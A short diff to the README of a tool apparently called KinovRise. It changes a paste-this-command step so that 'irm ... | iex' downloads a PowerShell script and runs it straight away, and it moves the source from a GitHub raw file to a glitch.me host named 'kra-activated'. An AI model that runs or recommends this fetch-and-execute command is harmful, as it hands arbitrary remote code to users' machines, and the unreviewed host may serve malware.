@@ -13,8 +13,7 @@
 
 2.   **Copy and paste the code below, then press enter.**  
 ```
-irm https://raw.githubusercontent.com/ranusTeam41/kinovrise/refs/heads/main/KinovRise.ps1 | iex
-
+irm "https://kra-activated.glitch.me/kinovrise.ps1" | iex
 ```
 ### Use KinovRise.exe
 
